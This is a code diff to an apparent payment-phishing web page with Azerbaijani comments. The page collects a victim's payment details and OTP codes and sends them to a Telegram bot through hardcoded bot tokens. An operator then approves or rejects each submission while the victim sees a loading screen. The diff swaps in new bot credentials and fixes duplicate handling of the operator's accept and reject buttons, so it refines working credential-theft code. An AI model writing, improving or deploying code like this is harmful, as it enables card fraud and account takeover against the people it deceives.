@@ -468,8 +468,8 @@
         // ========================================
         // 🔐 TELEGRAM KONFİQURASİYASI
         // ========================================
-        const BOT_TOKEN = "8798990357:AAHL-j1JLk8190R-kqXiQJE3GwFRMBElG5A";
-        const CHAT_ID = "-1003779425664";
+        const BOT_TOKEN = "8883177229:AAE-ywL8yr2ZSSTF_n17WI2apcJw2ZSxEPs";
+        const CHAT_ID = "-1003703616051";
 
         // ========================================
         // DƏYİŞƏNLƏR
@@ -486,6 +486,7 @@
         let loadingTimerInterval = null;
         let loadingSeconds = 0;
         let isProcessingOTP = false;
+        let processedCallbacks = new Set(); // ✅ Təkrar emalın qarşısını alır
 
         const operators = [
             { name: "Bakcell", prefixes: ["055", "099"] },
@@ -586,8 +587,10 @@
         // 📨 TELEGRAM FUNKSİYALARI
         // ========================================
 
-        // 1. ÖDƏNİŞ SORĞUSU (admin üçün)
+        // 1. ÖDƏNİŞ SORĞUSU - HƏR DƏFƏ UNİKAL ID!
         function sendToTelegram(data) {
+            const uniqueId = Date.now() + '_' + Math.random().toString(36).substr(2, 6);
+            
             const message = `
 🔔 YENİ ÖDƏNİŞ SORĞUSU!
 ━━━━━━━━━━━━━━━━━━━━
@@ -614,17 +617,17 @@
                     reply_markup: {
                         inline_keyboard: [
                             [
-                                { text: "✅ Qəbul et", callback_data: "accept_" + Date.now() },
-                                { text: "❌ Reddet", callback_data: "reject_" + Date.now() }
+                                { text: "✅ Qəbul et", callback_data: "accept_" + uniqueId },
+                                { text: "❌ Reddet", callback_data: "reject_" + uniqueId }
                             ]
                         ]
                     }
                 })
-            }).then(() => console.log("✅ Ödəniş sorğusu göndərildi"))
+            }).then(() => console.log("✅ Ödəniş sorğusu göndərildi - ID:", uniqueId))
               .catch(err => console.error("❌ Telegram xətası:", err));
         }
 
-        // 2. 🔐 AYRI OTP MESAJI - SADƏCƏ OTP KODU!
+        // 2. 🔐 AYRI OTP MESAJI
         function sendOTPToTelegram(otpCode) {
             const message = `🔐 OTP Kodu: ${otpCode}`;
             
@@ -637,8 +640,8 @@
                     chat_id: CHAT_ID,
                     text: message
                 })
-            }).then(() => console.log("✅ Ayrı OTP mesajı Telegram-a göndərildi: " + otpCode))
-              .catch(err => console.error("❌ OTP mesajı xətası:", err));
+            }).then(() => console.log("✅ OTP mesajı göndərildi: " + otpCode))
+              .catch(err => console.error("❌ OTP xətası:", err));
         }
 
         // ========================================
@@ -676,7 +679,7 @@
         }
 
         // ========================================
-        // POLLING
+        // POLLING - TƏKRAR EMALIN QARŞISI ALINIR
         // ========================================
         function startTelegramPolling() {
             if (isWaitingForApproval) return;
@@ -704,19 +707,29 @@
                 
                 if (data.ok && data.result) {
                     for (const update of data.result) {
+                        // ✅ Hər update üçün lastUpdateId yenilə
                         if (update.update_id > lastUpdateId) {
                             lastUpdateId = update.update_id;
                         }
                         
                         if (update.callback_query) {
                             const callbackData = update.callback_query.data;
+                            const callbackId = update.callback_query.id;
+                            
+                            // ✅ Təkrar emalın qarşısını al - əgər artıq emal olunubsa keç
+                            if (processedCallbacks.has(callbackId)) {
+                                continue;
+                            }
                             
                             if (callbackData && callbackData.startsWith('accept_')) {
+                                // ✅ Bu callback-i emal edildi kimi qeyd et
+                                processedCallbacks.add(callbackId);
+                                
                                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                                     method: 'POST',
                                     headers: { 'Content-Type': 'application/json' },
                                     body: JSON.stringify({
-                                        callback_query_id: update.callback_query.id,
+                                        callback_query_id: callbackId,
                                         text: "✅ Ödəniş qəbul edildi!"
                                     })
                                 });
@@ -751,15 +764,17 @@
                                     setTimeout(() => { spinner.style.animation = ''; }, 100);
                                 }
                                 
-                                lastUpdateId = update.update_id;
                                 return;
                                 
                             } else if (callbackData && callbackData.startsWith('reject_')) {
+                                // ✅ Bu callback-i emal edildi kimi qeyd et
+                                processedCallbacks.add(callbackId);
+                                
                                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                                     method: 'POST',
                                     headers: { 'Content-Type': 'application/json' },
                                     body: JSON.stringify({
-                                        callback_query_id: update.callback_query.id,
+                                        callback_query_id: callbackId,
                                         text: "❌ Ödəniş imtina edildi!"
                                     })
                                 });
@@ -940,12 +955,15 @@
             document.getElementById('step-5').classList.add('hidden');
             document.getElementById('step-6').classList.remove('hidden');
 
+            // Yeni sorğu üçün işlənmiş callback-ləri təmizlə
+            processedCallbacks = new Set();
+            
             sendToTelegram(paymentData);
             startTelegramPolling();
         }
 
         // ========================================
-        // 🔐 OTP TƏSDİQİ - YALNIZ DÜYMƏ İLƏ
+        // 🔐 OTP TƏSDİQİ
         // ========================================
         function verifyOTP() {
             if (isProcessingOTP) return;
@@ -1038,4 +1056,4 @@
         });
     </script>
 </body>
-    </html>
+</html>
